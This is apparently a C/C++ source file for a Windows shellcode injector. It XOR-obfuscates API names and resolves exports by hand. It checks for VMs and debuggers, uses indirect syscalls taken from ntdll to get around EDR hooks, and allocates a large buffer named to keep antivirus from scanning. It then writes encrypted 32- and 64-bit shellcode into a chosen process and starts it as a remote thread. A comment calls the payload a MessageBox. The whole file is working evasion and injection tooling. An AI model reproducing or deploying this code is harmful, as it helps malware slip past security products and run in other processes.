#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

/*
Compile w/ 
    -s (Strip symbols)
    -fmerge-all-constants (Optimisation des chaines ASCII)

gcc -s -fmerge-all-constants <> stubs.o -o injector.exe
*/
DWORD g_SSN_NtAllocateVirtualMemory = 0;
PVOID g_Stub_NtAllocateVirtualMemory = NULL;
DWORD g_SSN_NtWriteVirtualMemory = 0;
PVOID g_Stub_NtWriteVirtualMemory = NULL;
DWORD g_SSN_NtCreateThreadEx = 0;
PVOID g_Stub_NtCreateThreadEx = NULL;
DWORD g_SSN_NtWaitForSingleObject = 0;
PVOID g_Stub_NtWaitForSingleObject = NULL;

//NtCreateThreadEx
extern "C" NTSTATUS _stub_NtCreateThreadEx(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, void* ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE StartRoutine, void* Arguments, void* CreateFlags, void* ZeroBits, void* StackSize, void* MaximumStackSize, void* AttributeList
);

//Following definition taken from  https://github.com/VirtualAlllocEx/Direct-Syscalls-vs-Indirect-Syscalls/blob/main/CT_Indirect_Syscalls/CT_Indirect_Syscalls/syscalls.h
//NtAllocateVirtualMemory
extern "C" NTSTATUS _stub_NtAllocateVirtualMemory(
        HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect
    );
//NtWriteVirtualMemory
extern "C" NTSTATUS _stub_NtWriteVirtualMemory(
        HANDLE ProcessHandle, PVOID BaseAddress, PUCHAR Buffer, SIZE_T NumberOfBytesToWrite, PULONG NumberOfBytesWritten // Pointer to the variable that receives the number of bytes written
    );
//NtWaitForSingleObject
extern "C" NTSTATUS _stub_NtWaitForSingleObject(
        HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout
    );

typedef struct _SYSCALL_STUB {
    DWORD SyscallId;
    PVOID SyscallFunc;
} SYSCALL_STUB, *PSYSCALL_STUB;

typedef BOOL (WINAPI* VirtualFreeEx_t)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
typedef LPVOID (WINAPI * VirtualAllocExNuma_t) (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect, DWORD nndPreferred);
typedef BOOL (WINAPI * IsDebuggerPresent_t)();
typedef void (WINAPI * GetSystemInfo_t)(LPSYSTEM_INFO lpSystemInfo);
typedef HANDLE (WINAPI * GetCurrentProcess_t)();
typedef HANDLE (WINAPI * OpenProcess_t)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);

FARPROC __stdcall MyGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
    PBYTE pBase = (PBYTE) hModule;

    //Cast DOS header
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE){
        printf("[-] Erreur de recuperation du DOS Header\n");
		return NULL;
    }

    //Get NTHeader ptr from DOS header
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
		printf("[-] Erreur de recuperation du NtHeader\n");
        return NULL;
    }

    //Get Optionalheader for NTHeader
    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;
    //get _IMAGE_EXPORT_DIRECTORY addr from opt hdr
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY) (pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    /*
    typedef struct _IMAGE_EXPORT_DIRECTORY {
        DWORD   Characteristics;
        DWORD   TimeDateStamp;
        WORD    MajorVersion;
        WORD    MinorVersion;
        DWORD   Name;
        DWORD   Base;
        DWORD   NumberOfFunctions;
        DWORD   NumberOfNames;
        DWORD   AddressOfFunctions;     // RVA from base of image
        DWORD   AddressOfNames;         // RVA from base of image
        DWORD   AddressOfNameOrdinals;  // RVA from base of image
    } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
    */
    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++){
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        if (strcmp(lpProcName, pFunctionName) == 0) {
            WORD wFunctionOrdinal = FunctionOrdinalArray[i];
            PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[wFunctionOrdinal]);
            return (FARPROC)pFunctionAddress;
        }
    }
    return NULL;
}

_SYSCALL_STUB getDirectSyscallStub(HMODULE hNTDLL, PUCHAR NtFunctionName) {
    SYSCALL_STUB stub = { 0 };
    PVOID NtFunctionAddr = (PVOID)MyGetProcAddress(hNTDLL, (LPCSTR)NtFunctionName);
    if (!NtFunctionAddr) return stub;
    printf("[+] Function %s at %p\n", NtFunctionName, NtFunctionAddr);

    /*
    Au début de la fonction il y a : 
        <0x00>   4C 8B D1           mov r10, rcx
        <0x04>   B8 ?? 00 00 00     mov eax, [??]   -> Ici le SSN est renseigné avant le changement de contexte vers LSTAR 
                [...]              [...]
        <0x12>  0F 05              syscall          -> Get l'addr du syscall on va setup nous même un jump vers ce syscall (ça evite d'avoir un stub syscall dans notre code)
        <0x14>  C3                 ret 
    */
    BYTE expected[] = { 0x4C, 0x8B, 0xD1, 0xB8 };
    if (memcmp(NtFunctionAddr, expected, sizeof(expected)) != 0) {
        printf("[*] EDR hooked %s !\n", NtFunctionName);
        return stub;
    }
    DWORD syscallID = *(DWORD*)((BYTE*)NtFunctionAddr + 4);
    void* syscallAddress = (void*)((BYTE*)NtFunctionAddr + 0x12);

    printf("\t[+] %s stub : SSN 0x%x @ 0x%p\n", NtFunctionName, syscallID, syscallAddress);
    
    stub.SyscallId = syscallID;
    stub.SyscallFunc = syscallAddress;

    return stub;
}

void XOR(PUCHAR data, size_t data_sz, PUCHAR key, size_t key_sz){
    for (int i = 0; i < data_sz; i++){
        data[i] = data[i] ^ key[i%key_sz];
    }
}

BOOL isWow64(HANDLE hProcess) {
    BOOL bIsWow64 = FALSE;

    typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
    LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)MyGetProcAddress(GetModuleHandle(TEXT("kernel32")), "IsWow64Process");

    if (fnIsWow64Process) {
        fnIsWow64Process(hProcess, &bIsWow64);
    }

    return bIsWow64;
}


int vmDetect(){
    /*
        En générale les PC on plus de 4Gb de RAM et 2 Coeurs, donc si le pc sur lequel on run n'a pas ça c'est chelou.
        On va aussi utiliser VirtualAllocExNuma() : qui est fait pour etre utilise sur des PC avec plusieurs VPU physique
    */
    UCHAR key[] = { 0x72, 0x7a, 0x64, 0x68, 0x6f, 0x70, 0x5f, 0x69, 0x73, 0x5f, 0x61, 0x5f, 0x6e, 0x69, 0x63, 0x65, 0x5f, 0x67, 0x75, 0x79 };
    UCHAR _VirtualAllocExNuma[] = { 0x24, 0x13, 0x16, 0x1c, 0x1a, 0x11, 0x33, 0x28, 0x1f, 0x33, 0x0e, 0x3c, 0x2b, 0x11, 0x2d, 0x10, 0x32, 0x06, 0x45, 0x49 };
    UCHAR _GetSystemInfo[] = { 0x35, 0x1f, 0x10, 0x3b, 0x16, 0x03, 0x2b, 0x0c, 0x1e, 0x16, 0x0f, 0x39, 0x01, 0x69 };
    UCHAR _GetCurrentProcess[] = { 0x35, 0x1f, 0x10, 0x2b, 0x1a, 0x02, 0x2d, 0x0c, 0x1d, 0x2b, 0x31, 0x2d, 0x01, 0x0a, 0x06, 0x16, 0x2c, 0x67 };

    XOR(_VirtualAllocExNuma, sizeof(_VirtualAllocExNuma), key, sizeof(key));
    XOR(_GetSystemInfo, sizeof(_GetSystemInfo), key, sizeof(key));
    XOR(_GetCurrentProcess, sizeof(_GetCurrentProcess), key, sizeof(key));
    
    VirtualAllocExNuma_t pVirtualAllocExNuma = (VirtualAllocExNuma_t)MyGetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), (LPCSTR)_VirtualAllocExNuma);
    GetSystemInfo_t pGetSystemInfo = (GetSystemInfo_t)MyGetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), (LPCSTR)_GetSystemInfo);
    GetCurrentProcess_t pGetCurrentProcess = (GetCurrentProcess_t)MyGetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), (LPCSTR)_GetCurrentProcess);

    SYSTEM_INFO s;
    MEMORYSTATUSEX ms;
    DWORD procNum;
    DWORD ram;

    // check number of procs
    pGetSystemInfo(&s);
    procNum = s.dwNumberOfProcessors;
    if (procNum < 2) return true;

    // check RAM
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    ram = ms.ullTotalPhys / 1024 / 1024 / 1024;
    if (ram < 4) return true;

    //Check ExNuma alloc 
    if (pVirtualAllocExNuma != NULL) {
        LPVOID mem = pVirtualAllocExNuma(pGetCurrentProcess(), NULL, 1000, MEM_RESERVE |MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
        if (mem == NULL) return true;
    }

    return false;
}

int injectProc(int PID){
    int is64 = 0;
    printf("[+] Starting injection routine\n");

    if (vmDetect()){
        printf("[-] VM Detected execution ABORTING");
	    return 1;
    }
    printf("[+] No VM/Emulation detcted\n");

    UCHAR _NtAllocateVirtualMemory[] = { 0x3c, 0x0e, 0x25, 0x04, 0x03, 0x1f, 0x3c, 0x08, 0x07, 0x3a, 0x37, 0x36, 0x1c, 0x1d, 0x16, 0x04, 0x33, 0x2a, 0x10, 0x14, 0x1d, 0x08, 0x1d, 0x68 };
    UCHAR _NtWriteVirtualMemory[] = { 0x3c, 0x0e, 0x33, 0x1a, 0x06, 0x04, 0x3a, 0x3f, 0x1a, 0x2d, 0x15, 0x2a, 0x0f, 0x05, 0x2e, 0x00, 0x32, 0x08, 0x07, 0x00, 0x72 };
    UCHAR _NtCreateThreadEx[] = { 0x3c, 0x0e, 0x27, 0x1a, 0x0a, 0x11, 0x2b, 0x0c, 0x27, 0x37, 0x13, 0x3a, 0x0f, 0x0d, 0x26, 0x1d, 0x5f };
    UCHAR _NtWaitForSingleObject[] = { 0x3c, 0x0e, 0x33, 0x09, 0x06, 0x04, 0x19, 0x06, 0x01, 0x0c, 0x08, 0x31, 0x09, 0x05, 0x06, 0x2a, 0x3d, 0x0d, 0x10, 0x1a, 0x06, 0x7a };    
    UCHAR _VirtualFreeEx[] = { 0x24, 0x13, 0x16, 0x1c, 0x1a, 0x11, 0x33, 0x2f, 0x01, 0x3a, 0x04, 0x1a, 0x16, 0x69 };
    UCHAR _VirtualAllocExNuma[] = { 0x24, 0x13, 0x16, 0x1c, 0x1a, 0x11, 0x33, 0x28, 0x1f, 0x33, 0x0e, 0x3c, 0x2b, 0x11, 0x2d, 0x10, 0x32, 0x06, 0x75 };
    UCHAR _IsDebuggerPresent[] = { 0x3b, 0x09, 0x20, 0x0d, 0x0d, 0x05, 0x38, 0x0e, 0x16, 0x2d, 0x31, 0x2d, 0x0b, 0x1a, 0x06, 0x0b, 0x2b, 0x67 };
    UCHAR _OpenProcess[] = { 0x3d, 0x0a, 0x01, 0x06, 0x3f, 0x02, 0x30, 0x0a, 0x16, 0x2c, 0x12, 0x5f };
    UCHAR key[] = { 0x72, 0x7a, 0x64, 0x68, 0x6f, 0x70, 0x5f, 0x69, 0x73, 0x5f, 0x61, 0x5f, 0x6e, 0x69, 0x63, 0x65, 0x5f, 0x67, 0x75, 0x79 };
        
    XOR(_NtAllocateVirtualMemory, sizeof(_NtAllocateVirtualMemory), key, sizeof(key));
    XOR(_NtWriteVirtualMemory, sizeof(_NtWriteVirtualMemory), key, sizeof(key));
    XOR(_NtCreateThreadEx, sizeof(_NtCreateThreadEx), key, sizeof(key));
    XOR(_NtWaitForSingleObject, sizeof(_NtWaitForSingleObject), key, sizeof(key));
    XOR(_VirtualFreeEx, sizeof(_VirtualFreeEx), key, sizeof(key));
    XOR(_IsDebuggerPresent, sizeof(_IsDebuggerPresent), key, sizeof(key));
    XOR(_OpenProcess, sizeof(_OpenProcess), key, sizeof(key));

    printf("\
Resolved functions : \n \
    %s \n \
    %s \n \
    %s \n \
    %s \n \
    %s \n \
    %s \n \
    %s \n", _NtAllocateVirtualMemory, _NtWriteVirtualMemory, _NtCreateThreadEx, _NtWaitForSingleObject, _VirtualFreeEx, _IsDebuggerPresent, _OpenProcess);

    HMODULE k32 = GetModuleHandle(TEXT("kernel32.dll"));
    VirtualFreeEx_t         pVirtualFreeEx       = (VirtualFreeEx_t) MyGetProcAddress(k32, (LPCSTR)_VirtualFreeEx);
    IsDebuggerPresent_t     pIsDebuggerPresent   = (IsDebuggerPresent_t) MyGetProcAddress(k32, (LPCSTR)_IsDebuggerPresent);
    OpenProcess_t           pOpenProcess         = (OpenProcess_t) MyGetProcAddress(k32, (LPCSTR)_OpenProcess);

    if (pIsDebuggerPresent()) {
        printf("[-] Debugger detected ! \n");
        return -2;
    }

    // MessageBox shellcode ciphered
    UCHAR shellcode_32[] = { 0x8e, 0x92, 0xeb, 0x68, 0x6f, 0x70, 0x3f, 0x58, 0xa1, 0xd6, 0x84, 0x3b, 0xe5, 0x3b, 0x53, 0xee, 0x0d, 0x6b, 0xfe, 0x2b, 0x66, 0x75, 0xd3, 0x22, 0x49, 0xfb, 0x2d, 0x41, 0x42, 0xa0, 0x50, 0x9f, 0xc2, 0x55, 0x02, 0x19, 0x5d, 0x4b, 0x55, 0xb8, 0xbd, 0x77, 0x65, 0xaf, 0x26, 0x05, 0xb0, 0x3b, 0x24, 0xd4, 0x33, 0x4f, 0xe5, 0x2b, 0x5f, 0x64, 0x8f, 0xec, 0x35, 0x01, 0xf7, 0xba, 0x10, 0x24, 0x6e, 0xa0, 0xd4, 0x31, 0x53, 0x5e, 0xb2, 0xd4, 0x26, 0x71, 0x33, 0xe0, 0x96, 0x13, 0x49, 0x30, 0xf9, 0x4e, 0xef, 0x59, 0x90, 0x71, 0x89, 0x58, 0xb3, 0xf3, 0xa0, 0x90, 0x63, 0x68, 0xa4, 0x5d, 0xbf, 0x12, 0x81, 0x7a, 0x0f, 0x82, 0x5f, 0x15, 0x4b, 0x05, 0xbf, 0x31, 0xf8, 0x07, 0x45, 0x5e, 0xbd, 0x0f, 0xe8, 0x69, 0x14, 0xec, 0x2d, 0x65, 0x73, 0xa9, 0xef, 0x6c, 0xe4, 0x71, 0x8f, 0xe0, 0x37, 0x7b, 0x45, 0x04, 0x35, 0x08, 0x3a, 0x3f, 0x0e, 0x98, 0x95, 0x21, 0x2d, 0x20, 0xef, 0x7a, 0x86, 0xf0, 0xa0, 0x96, 0x8c, 0x02, 0x89, 0x54, 0x6e, 0x69, 0x63, 0x10, 0x2c, 0x02, 0x07, 0x4a, 0x40, 0x54, 0x00, 0x04, 0x03, 0x70, 0x37, 0x25, 0x04, 0x79, 0x66, 0xa0, 0xbb, 0x03, 0x63, 0x8d, 0x59, 0x67, 0x75, 0x79, 0x22, 0x0d, 0x0a, 0x0d, 0x0b, 0x70, 0xb7, 0x78, 0x73, 0x5f, 0x61, 0x16, 0x00, 0x03, 0x06, 0x06, 0x2b, 0x02, 0x11, 0x59, 0x10, 0x03, 0x44, 0x3a, 0x06, 0x14, 0x3e, 0x69, 0x19, 0x5f, 0x09, 0x1a, 0xed, 0x3f, 0x64, 0x9a, 0x8a, 0xdc, 0x95, 0x64, 0x58, 0x70, 0x0c, 0xce, 0xfa, 0xcd, 0xc2, 0x96, 0xa6, 0xdc, 0xa5, 0x77, 0x52, 0x6f, 0x1f, 0x6f, 0xdf, 0x9c, 0x95, 0x0c, 0x77, 0xc1, 0x23, 0x7b, 0x1d, 0x1f, 0x35, 0x69, 0x20, 0xa0, 0xb4 };
    UCHAR shellcode_64[] = { 0x8e, 0x32, 0xe5, 0x8c, 0x9f, 0x8f, 0xa0, 0x96, 0x9b, 0x93, 0x61, 0x5f, 0x6e, 0x28, 0x32, 0x24, 0x0f, 0x35, 0x3d, 0x48, 0xa0, 0x2b, 0x32, 0x0d, 0x27, 0xfb, 0x0d, 0x09, 0x3b, 0xd4, 0x33, 0x47, 0x26, 0xe2, 0x31, 0x45, 0x17, 0xec, 0x07, 0x29, 0x3a, 0x75, 0xd3, 0x22, 0x25, 0x3d, 0x6e, 0xa0, 0x3b, 0x6e, 0xa1, 0xf3, 0x52, 0x08, 0x1f, 0x67, 0x73, 0x47, 0x34, 0xb8, 0xbb, 0x77, 0x25, 0x69, 0xae, 0x92, 0xb2, 0x3b, 0x3b, 0xd4, 0x33, 0x7f, 0x2f, 0x38, 0xe8, 0x27, 0x63, 0x2f, 0x74, 0xa9, 0x14, 0xfb, 0x1c, 0x70, 0x64, 0x72, 0x50, 0xec, 0x01, 0x5f, 0x61, 0x5f, 0xe5, 0xe9, 0xeb, 0x65, 0x5f, 0x67, 0x3d, 0xfc, 0xb2, 0x0e, 0x03, 0x20, 0x6e, 0xa0, 0x0f, 0x2d, 0xf8, 0x1f, 0x41, 0xd4, 0x26, 0x71, 0x2a, 0x64, 0x8f, 0x84, 0x23, 0x31, 0x8d, 0xb3, 0x25, 0xe3, 0x5b, 0xf8, 0x17, 0x68, 0xa5, 0x12, 0x50, 0x96, 0x26, 0x58, 0xa3, 0x24, 0x9e, 0xae, 0x78, 0xd5, 0x33, 0x7b, 0xa5, 0x50, 0x8f, 0x05, 0xae, 0x25, 0x70, 0x13, 0x45, 0x57, 0x2b, 0x50, 0xb2, 0x10, 0x87, 0x3f, 0x31, 0xf2, 0x32, 0x5e, 0x2d, 0x69, 0xbf, 0x16, 0x1e, 0xe2, 0x7f, 0x17, 0x25, 0xd4, 0x2e, 0x75, 0x2a, 0x64, 0x8f, 0x26, 0xfe, 0x7d, 0xfa, 0x32, 0x65, 0xb8, 0x2e, 0x28, 0x1e, 0x31, 0x2d, 0x06, 0x3b, 0x1e, 0x36, 0x28, 0x3a, 0x24, 0x05, 0x2f, 0xf6, 0x95, 0x52, 0x3b, 0x36, 0x97, 0x8f, 0x28, 0x1e, 0x30, 0x29, 0x17, 0xea, 0x4d, 0x87, 0x22, 0x9c, 0x9a, 0xa0, 0x3a, 0x9d, 0x72, 0x72, 0x7a, 0x64, 0x1d, 0x1c, 0x15, 0x2d, 0x5a, 0x41, 0x71, 0x05, 0x33, 0x02, 0x69, 0x3a, 0x24, 0xe5, 0x2b, 0x02, 0x5f, 0x75, 0x85, 0xb1, 0x21, 0xa8, 0xb1, 0x5f, 0x69, 0x73, 0x5f, 0x89, 0x4e, 0x6e, 0x69, 0x63, 0x2c, 0x31, 0x0d, 0x10, 0x1a, 0x06, 0x1f, 0x00, 0x48, 0x0d, 0x09, 0x7f, 0x3b, 0x1a, 0x3b, 0x00, 0x5f, 0x34, 0x81, 0x65, 0x65, 0x5f, 0x67, 0x25, 0x0e, 0x1c, 0x1f, 0x00, 0x68, 0x2e, 0x28, 0x17, 0x58, 0xba, 0x1e, 0xdb, 0x1a, 0xed, 0x3f, 0x64, 0x9a, 0x8a, 0xdc, 0x95, 0x64, 0x58, 0x70, 0x25, 0xd2, 0xc9, 0xe5, 0xe2, 0xf4, 0x8c, 0x8a, 0x29, 0xdc, 0xaa, 0x41, 0x5f, 0x63, 0x23, 0x6d, 0xf5, 0x82, 0x92, 0x0f, 0x61, 0xd3, 0x28, 0x63, 0x2d, 0x06, 0x19, 0x5f, 0x38, 0x1e, 0xe7, 0xb3, 0x9c, 0xb0 };
    
    XOR(shellcode_32, sizeof(shellcode_32), key, sizeof(key));
    XOR(shellcode_64, sizeof(shellcode_64), key, sizeof(key));

    char *tooBigForAVtoScan = NULL;
    tooBigForAVtoScan = (char*)malloc(150000000); //150Mb
    
    if (tooBigForAVtoScan == NULL) {
        printf("malloc of 150 Mb failed: %ul\n", GetLastError());
	    return 1;
    }
    memset(tooBigForAVtoScan, 00, 100000000);
    printf("[+] Allocated 150Mb buffer\n");

    PUCHAR shellcode = nullptr;
    SIZE_T scSize = 0;

    HANDLE hProcess = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    if (!isWow64(hProcess)) {
        is64 = 1;
        shellcode = shellcode_64;
        scSize = sizeof(shellcode_64);
    } else {
        shellcode = shellcode_32;
        scSize = sizeof(shellcode_32);
    }

    HMODULE hntdll = GetModuleHandle(TEXT("ntdll.dll"));

    _SYSCALL_STUB stub_alloc = getDirectSyscallStub(hntdll, _NtAllocateVirtualMemory);
    g_SSN_NtAllocateVirtualMemory = stub_alloc.SyscallId;
    g_Stub_NtAllocateVirtualMemory = stub_alloc.SyscallFunc;
    PVOID memPoolPtr= NULL;
    _stub_NtAllocateVirtualMemory(hProcess, &memPoolPtr, 0, &scSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

    if (memPoolPtr == NULL) {
	    printf("Indirect sycall for page alloc failed: %ul\n", GetLastError());
	    return 1;
    }
    printf("[+] Mem page allocated at: 0x%p\n", memPoolPtr);
    _SYSCALL_STUB stub_WriteMem = getDirectSyscallStub(hntdll, _NtWriteVirtualMemory);
    g_SSN_NtWriteVirtualMemory = stub_WriteMem.SyscallId;
    g_Stub_NtWriteVirtualMemory = stub_WriteMem.SyscallFunc;
    ULONG bytesWritten = 0;
    _stub_NtWriteVirtualMemory(hProcess, memPoolPtr, shellcode, scSize, &bytesWritten);
    printf("[+] Shellcode %s written (%d)\n", is64 ? "64bit" : "32bit", bytesWritten);


    // Stub CreateRemoteThreadEx
    _SYSCALL_STUB stub_CreateRThread = getDirectSyscallStub(hntdll, _NtCreateThreadEx);
    g_SSN_NtCreateThreadEx = stub_CreateRThread.SyscallId;
    g_Stub_NtCreateThreadEx = stub_CreateRThread.SyscallFunc;
    HANDLE  hThread  = NULL;
    ACCESS_MASK acc  = THREAD_ALL_ACCESS;
    _stub_NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)memPoolPtr, NULL, FALSE, NULL, NULL, NULL, NULL);
    if (hThread == NULL) {
        printf("Create thread on remote proc failed : %ul\n", GetLastError());
        return 1;
    }
    printf("[+] Remote thread created.\n");
    printf("[+] Waiting for thread.\n");
    _SYSCALL_STUB stub_WaitForObj = getDirectSyscallStub(hntdll, _NtWaitForSingleObject);
    g_SSN_NtWaitForSingleObject = stub_WaitForObj.SyscallId;
    g_Stub_NtWaitForSingleObject = stub_WaitForObj.SyscallFunc;
    _stub_NtWaitForSingleObject(hThread, FALSE, NULL);

    printf("[+] Sehellcode done.\n");
    free(tooBigForAVtoScan);

    pVirtualFreeEx(hProcess, memPoolPtr, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}

int enumProc(){
    int proc_cnt = 0;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    Process32First(snapshot, &pe32);

    do {
        printf("[PID: %u] %s\n", pe32.th32ProcessID, pe32.szExeFile);
        proc_cnt++;
    } while (Process32Next(snapshot, &pe32));

    CloseHandle(snapshot);
    return proc_cnt;
}

int main(int argc, char **argv){
    int proc_cnt = enumProc();
    if (proc_cnt <= 0) return 1;

    int choice = -1;
    while (choice <= 0) {
        printf("[PID] > ");
        scanf("%d", &choice);
        if (choice <= 4) {
            printf("[-] Bad PID.\n");
            choice = -1;
        }
    }
    
    return injectProc(choice);
}